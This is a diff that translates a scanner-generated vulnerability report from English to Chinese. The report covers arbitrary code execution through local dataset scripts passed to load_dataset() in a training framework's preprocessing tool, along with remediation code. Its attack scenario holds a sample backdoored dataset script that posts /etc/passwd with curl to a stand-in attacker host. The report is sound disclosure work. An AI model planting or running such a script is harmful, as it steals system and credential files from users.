@@ -1,25 +1,25 @@
-# Vulnerability Report: Arbitrary Python Script Execution via load_dataset
+# VULN-tools-load_dataset-003：load_dataset执行任意Python脚本致代码注入风险
 
-## Vulnerability Metadata
+## 漏洞元数据
 
-| Field | Value |
-|-------|-------|
+| 字段 | 值 |
+|------|-----|
 | **ID** | VULN-tools-load_dataset-003 |
-| **Type** | Python Script Execution (CWE-94) |
-| **Severity** | High |
-| **CWE** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
-| **Location** | tools/data_handler.py (lines 518-526) |
-| **Function** | `build_dataset()` |
-| **Entry Point** | tools/preprocess_data.py - main() |
-| **Trust Level** | untrusted_local |
+| **类型** | Python 脚本执行 (CWE-94) |
+| **严重性** | High |
+| **CWE** | CWE-94：代码生成控制不当（代码注入） |
+| **位置** | tools/data_handler.py (第 518-526 行) |
+| **函数** | `build_dataset()` |
+| **入口点** | tools/preprocess_data.py - main() |
+| **信任级别** | untrusted_local |
 
-## Vulnerability Description
+## 漏洞描述
 
-Local Python scripts passed via `--input` command-line argument are executed directly through HuggingFace's `load_dataset()` function without any validation or security measures. The `_has_py_script()` function only verifies the presence of a `.py` file extension but does not validate the script content, origin, or behavior. Malicious dataset generation scripts can execute arbitrary code during the dataset loading process.
+通过 `--input` 命令行参数传递的本地 Python 脚本被直接通过 HuggingFace 的 `load_dataset()` 函数执行，无任何验证或安全措施。`_has_py_script()` 函数仅验证 `.py` 文件扩展名是否存在，但不验证脚本内容、来源或行为。恶意数据集生成脚本可在数据集加载过程中执行任意代码。
 
-## Affected Code
+## 受影响代码
 
-### Primary Vulnerable Function (tools/data_handler.py, lines 505-526)
+### 主要漏洞函数 (tools/data_handler.py, 第 505-526 行)
 
 ```python
 def build_dataset(args):
@@ -35,9 +35,9 @@ def build_dataset(args):
     split_flag = "train"
     load_from_local = os.path.exists(args.input)
     if load_from_local:
-        if _has_py_script(args.input):                        # VULNERABLE: Only checks .py extension
+        if _has_py_script(args.input):                        # 漏洞点：仅检查 .py 扩展名
             logger.info("loading data from a local python script")
-            raw_datasets = load_dataset(                      # CODE EXECUTION: Script is executed
+            raw_datasets = load_dataset(                      # 代码执行：脚本被执行
                 args.input,
                 split=split_flag,
                 num_proc=None if args.streaming else args.workers,
@@ -46,7 +46,7 @@ def build_dataset(args):
             )
 ```
 
-### Inadequate Validation Function (tools/data_handler.py, lines 490-502)
+### 不充分验证函数 (tools/data_handler.py, 第 490-502 行)
 
 ```python
 def _has_py_script(input_name):
@@ -57,14 +57,14 @@ def _has_py_script(input_name):
         else:
             has_py_script = False
     else:
-        if input_name.split('.')[-1] == 'py':                 # ONLY checks file extension
+        if input_name.split('.')[-1] == 'py':                 # 仅检查文件扩展名
             has_py_script = True
         else:
             has_py_script = False
     return has_py_script
 ```
 
-### Entry Point (tools/preprocess_data.py, lines 172-179)
+### 入口点 (tools/preprocess_data.py, 第 172-179 行)
 
 ```python
 def main():
@@ -74,53 +74,53 @@ def main():
     splitter = build_splitter(args)
 
     logger.info("building dataset: %s", args.input)
-    raw_data = build_dataset(args)                            # User input flows here
+    raw_data = build_dataset(args)                            # 用户输入流向此处
 ```
 
-## Data Flow Analysis
+## 数据流分析
 
 ```
-argv (command line) 
+argv (命令行) 
     ↓ 
 argparse.parse_args() 
     ↓ 
-args.input (user-controlled path)
+args.input (用户控制的路径)
     ↓
 os.path.exists(args.input)
     ↓
-_has_py_script(args.input) → checks only .py extension
+_has_py_script(args.input) → 仅检查 .py 扩展名
     ↓
-load_dataset(args.input) → EXECUTES Python script
+load_dataset(args.input) → 执行 Python 脚本
 ```
 
-## Attack Scenario
+## 攻击场景
 
-1. **Attacker prepares malicious dataset generator**:
+1. **攻击者准备恶意数据集生成器**：
    ```python
    # malicious_dataset.py
    import os
    import subprocess
    
-   # This file appears to be a normal HuggingFace dataset script
-   # but contains backdoor code
+   # 此文件看似正常 HuggingFace 数据集脚本
+   # 但包含后门代码
    
-   # Malicious code executes during import
+   # 恶意代码在导入时执行
    subprocess.run(['curl', 'http://attacker.com/exfil', '-d', open('/etc/passwd').read()])
    
-   # Normal dataset interface (decoy)
+   # 正常数据集接口（伪装）
    import datasets
    class MaliciousDataset(datasets.GeneratorBasedBuilder):
        def _split_generators(self, dl_manager):
-           # ... normal-looking dataset code
+           # ... 正常的数据集代码
    ```
 
-2. **User downloads or receives the malicious script** from:
-   - HuggingFace Hub (community dataset)
-   - Shared network drive
-   - Email attachment
-   - Compromised repository
+2. **用户下载或接收恶意脚本**，来源：
+   - HuggingFace Hub（社区数据集）
+   - 共享网络驱动器
+   - 邮件附件
+   - 被入侵的仓库
 
-3. **User runs preprocessing tool**:
+3. **用户运行预处理工具**：
    ```bash
    python tools/preprocess_data.py \
        --input ./malicious_dataset.py \
@@ -128,58 +128,58 @@ load_dataset(args.input) → EXECUTES Python script
        --output-prefix ./processed_data
    ```
 
-4. **Arbitrary code executes** with user's privileges.
+4. **任意代码以用户权限执行**。
 
-## Security Impact
+## 安全影响
 
-| Impact Category | Severity | Description |
-|-----------------|----------|-------------|
-| **Remote Code Execution** | High | Attacker can execute arbitrary Python code |
-| **Data Exfiltration** | High | Access to sensitive files, credentials, environment variables |
-| **Lateral Movement** | Medium | Potential pivot point in larger attack chain |
-| **Privilege Escalation** | Medium | If run in elevated context (unlikely but possible) |
+| 影响类别 | 严重性 | 描述 |
+|----------|--------|------|
+| **远程代码执行** | High | 攻击者可执行任意 Python 代码 |
+| **数据泄露** | High | 可访问敏感文件、凭证、环境变量 |
+| **横向移动** | Medium | 大型攻击链中潜在的跳板点 |
+| **权限提升** | Medium | 若在提升上下文中运行（可能但不太可能） |
 
-## Comparison with Known Security Measures
+## 与已知安全措施对比
 
-### HuggingFace Datasets Security Model
+### HuggingFace Datasets 安全模型
 
-HuggingFace's `load_dataset()` function is designed to execute dataset generation scripts. However:
+HuggingFace 的 `load_dataset()` 函数设计为执行数据集生成脚本。然而：
 
-1. **No trust_remote_code equivalent**: Unlike `AutoTokenizer.from_pretrained()` which has `trust_remote_code=False` by default in newer versions, `load_dataset()` with a local script path has no such protection.
+1. **无 trust_remote_code 等效机制**：不同于 `AutoTokenizer.from_pretrained()` 在新版默认 `trust_remote_code=False`，带本地脚本路径的 `load_dataset()` 无此保护。
 
-2. **No security warning**: The code does not warn users that the input script will be executed.
+2. **无安全警告**：代码不警告用户输入脚本将被执行。
 
-3. **Project's own security note acknowledges partial risk**: The SECURITYNOTE.md (line 118) mentions:
+3. **项目自身安全说明承认部分风险**：SECURITYNOTE.md (第 118 行) 提到：
    > "数据集可能包含敏感或不合法内容，导致合规问题。数据集中可能存在质量问题，如标签错误或数据偏差"
    
-   But this only covers **data quality** issues, NOT **code execution** risks!
+   但这仅覆盖**数据质量**问题，未提及**代码执行**风险！
 
-## Existing Mitigations
+## 现有缓解措施
 
-| Mitigation | Status | Evidence |
-|------------|--------|----------|
-| Content validation | ❌ Not implemented | `_has_py_script()` only checks extension |
-| Script signature verification | ❌ Not implemented | No signature check present |
-| Sandbox execution | ❌ Not implemented | Direct `load_dataset()` call |
-| Security warning | ❌ Not implemented | No warning about script execution |
-| Input sanitization | ❌ Not implemented | Path used directly |
-| Allowlist/denylist | ❌ Not implemented | No path restrictions |
+| 缓解措施 | 状态 | 证据 |
+|----------|------|------|
+| 内容验证 | ❌ 未实施 | `_has_py_script()` 仅检查扩展名 |
+| 脚本签名验证 | ❌ 未实施 | 无签名检查 |
+| 沙箱执行 | ❌ 未实施 | 直接 `load_dataset()` 调用 |
+| 安全警告 | ❌ 未实施 | 无脚本执行警告 |
+| 输入过滤 | ❌ 未实施 | 直接使用路径 |
+| 白名单/黑名单 | ❌ 未实施 | 无路径限制 |
 
-## Evidence from Codebase
+## 代码库证据
 
-### No Protection in tokenizer module (for comparison)
+### tokenizer 模块无保护（对比）
 
-The tokenizer module implements `trust_remote_code=False`:
+tokenizer 模块实施 `trust_remote_code=False`：
 ```python
-# mindspeed/tokenizer/tokenizer.py (line 75)
+# mindspeed/tokenizer/tokenizer.py (第 75 行)
 hf_tokenizer_kwargs["trust_remote_code"] = False
 ```
 
-But `load_dataset()` in data_handler.py has no equivalent protection.
+但 data_handler.py 中的 `load_dataset()` 无等效保护。
 
-## Recommended Remediation
+## 修复建议
 
-### Priority 1: Add Security Warning
+### 优先级 1：添加安全警告
 
 ```python
 def build_dataset(args):
@@ -188,60 +188,60 @@ def build_dataset(args):
     if load_from_local:
         if _has_py_script(args.input):
             logger.warning(
-                "SECURITY WARNING: Loading dataset from Python script '%s'. "
-                "This script will be EXECUTED. Only use scripts from trusted sources!",
+                "安全警告：从 Python 脚本 '%s' 加载数据集。"
+                "此脚本将被执行。仅使用来自可信来源的脚本！",
                 args.input
             )
-            # Optionally prompt user for confirmation
+            # 可选提示用户确认
             # if sys.stdin.isatty():
-            #     response = input("Continue? [y/N]: ")
+            #     response = input("继续? [y/N]: ")
             #     if response.lower() != 'y':
             #         sys.exit(1)
 ```
 
-### Priority 2: Implement Script Allowlist
+### 优先级 2：实施脚本白名单
 
 ```python
-# Configuration for allowed dataset scripts
+# 已知良性脚本的配置
 ALLOWED_DATASET_SCRIPTS = [
-    # Add hash or path patterns for known-good scripts
+    # 添加已知良性脚本的哈希或路径模式
 ]
 
 def _validate_script_safety(script_path):
-    """Validate that script is from a trusted source."""
+    """验证脚本来自可信来源。"""
     import hashlib
     
-    # Calculate script hash
+    # 计算脚本哈希
     with open(script_path, 'rb') as f:
         script_hash = hashlib.sha256(f.read()).hexdigest()
     
-    # Check against allowlist
+    # 检查白名单
     if script_hash not in ALLOWED_DATASET_SCRIPTS:
         raise SecurityError(
-            f"Dataset script {script_path} not in trusted allowlist. "
-            f"Hash: {script_hash}"
+            f"数据集脚本 {script_path} 不在可信白名单中。"
+            f"哈希: {script_hash}"
         )
 ```
 
-### Priority 3: Add Sandbox Option
+### 优先级 3：添加沙箱选项
 
 ```python
 def build_dataset(args):
     # ...
     if _has_py_script(args.input):
         if args.sandbox_dataset_script:
-            # Use restricted Python environment
+            # 使用受限 Python 环境
             raw_datasets = _load_dataset_sandboxed(args.input, ...)
         else:
-            logger.warning("Executing dataset script without sandbox...")
+            logger.warning("无沙箱执行数据集脚本...")
             raw_datasets = load_dataset(args.input, ...)
 ```
 
-### Priority 4: Update Documentation
+### 优先级 4：更新文档
 
-Add to SECURITYNOTE.md:
+添加到 SECURITYNOTE.md：
 ```markdown
-### Dataset Script Execution Warning
+### 数据集脚本执行警告
 
 当使用 `--input` 参数指定本地 Python 脚本作为数据集来源时，该脚本将被执行。
 请确保：
@@ -250,37 +250,37 @@ Add to SECURITYNOTE.md:
 3. 考虑使用非脚本数据格式（如 JSON, Parquet, CSV）
 ```
 
-## References
+## 参考资料
 
-- **CWE-94**: Improper Control of Generation of Code ('Code Injection') - https://cwe.mitre.org/data/definitions/94.html
-- **HuggingFace Datasets Security**: https://huggingface.co/docs/datasets/security
-- **Similar vulnerabilities in ML frameworks**: 
+- **CWE-94**：代码生成控制不当（代码注入） - https://cwe.mitre.org/data/definitions/94.html
+- **HuggingFace Datasets 安全**：https://huggingface.co/docs/datasets/security
+- **ML 框架中的类似漏洞**：
   - CVE-2025-32434 (PyTorch torch.load)
-  - Model file code execution in various ML frameworks
+  - 各 ML 框架中的模型文件代码执行
 
-## Additional Context
+## 附加上下文
 
-| Factor | Value |
-|--------|-------|
-| Attack complexity | Low |
-| Privileges required | User execution context |
-| User interaction | Required (user must run the tool) |
-| Scope | Changed (can affect other processes/files) |
-| Framework context | Internal training framework - trusted admin scenario expected |
-| Real-world likelihood | Medium - depends on user downloading scripts from untrusted sources |
+| 因素 | 值 |
+|------|-----|
+| 攻击复杂度 | Low |
+| 所需权限 | 用户执行上下文 |
+| 用户交互 | Required（用户必须运行工具） |
+| 范围 | Changed（可影响其他进程/文件） |
+| 框架上下文 | 内部训练框架 - 预期可信管理员场景 |
+| 实际可能性 | Medium - 取决于用户是否从不可信来源下载脚本 |
 
-## Verification
+## 验证
 
-To verify this vulnerability:
+验证此漏洞：
 
-1. Create a test script that writes to a known location when executed:
+1. 创建测试脚本，执行时写入已知位置：
    ```python
    # test_dataset.py
-   open('/tmp/pwned.txt', 'w').write('Code executed!')
+   open('/tmp/pwned.txt', 'w').write('代码已执行！')
    raise SystemExit
    ```
 
-2. Run:
+2. 运行：
    ```bash
    python tools/preprocess_data.py \
        --input ./test_dataset.py \
@@ -288,8 +288,8 @@ To verify this vulnerability:
        --output-prefix ./test_output
    ```
 
-3. Check if `/tmp/pwned.txt` was created (confirms code execution).
+3. 检查 `/tmp/pwned.txt` 是否创建（确认代码执行）。
 
 ---
 
-*Generated by security scanner on 2026-04-20*
+*由安全扫描器于 2026-04-20 生成*
